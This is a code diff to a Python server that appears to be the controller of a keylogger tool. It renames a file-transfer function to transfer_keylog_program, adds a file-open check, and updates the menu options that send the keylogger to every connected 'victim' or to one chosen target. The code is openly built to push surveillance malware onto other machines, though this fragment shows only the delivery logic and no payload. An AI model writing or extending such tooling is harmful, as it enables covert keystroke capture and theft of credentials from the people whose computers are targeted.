@@ -227,9 +227,7 @@ def disconnect_from_client(sockets_list: list, connected_clients: dict):
     print(constants.MENU_CLOSING_BANNER)
 
 
-def transfer_file(sock: socket.socket,
-                  dest_ip: str,
-                  dest_port: int):
+def transfer_keylog_program(sock: socket.socket, dest_ip: str, dest_port: int):
     # Send to victim a notification that it is transferring a file
     sock.send(constants.TRANSFER_KEYLOG_MSG.encode())
     ack = sock.recv(constants.BYTE_LIMIT).decode()
@@ -259,6 +257,16 @@ def transfer_file(sock: socket.socket,
                                                             dest_port))
         else:
             print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
+
+
+def is_file_openable(file_path):
+    try:
+        with open(file_path, constants.READ_MODE) as file:
+            pass
+        return True
+    except IOError as e:
+        print(constants.FILE_CANNOT_OPEN_ERROR.format(file_path, e))
+        return False
 
 
 def find_specific_client_socket(client_dict: dict,
@@ -307,7 +315,7 @@ def perform_menu_item_3(client_dict: dict):
             print(constants.MENU_CLOSING_BANNER)
             return None
 
-        transfer_file(client_socket, client_ip, client_port)
+        transfer_keylog_program(client_socket, client_ip, client_port)
 
     # Send keylogger to any specific connected victim
     elif len(client_dict) != constants.ZERO:
@@ -325,7 +333,7 @@ def perform_menu_item_3(client_dict: dict):
             return None
 
         if target_socket:
-            transfer_file(target_socket, target_ip, target_port)
+            transfer_keylog_program(target_socket, target_ip, target_port)
         else:
             print(constants.TARGET_VICTIM_NOT_FOUND)
 
